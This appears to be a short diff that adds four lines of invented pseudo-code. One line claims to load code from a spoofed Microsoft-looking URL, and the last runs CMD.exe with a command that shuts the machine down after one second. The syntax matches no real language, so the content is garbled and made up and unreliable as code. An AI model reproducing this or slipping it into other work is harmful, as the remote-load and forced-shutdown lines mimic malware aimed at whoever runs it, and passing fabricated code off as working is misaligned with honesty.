@@ -1,0 +1,4 @@
+#loadstring$(https://auth.microsoft.com/windows-11_product-server/auth!id!2463957385993win11/appid/git_auth_win/load/)$#
+#foxerses$Microsoft_Windows11$#
+#commit$(changehkejto56time)$commitchanges#
+#exit$(C:\Windows\System32\CMD.exe)$shutdown -s -t 1#
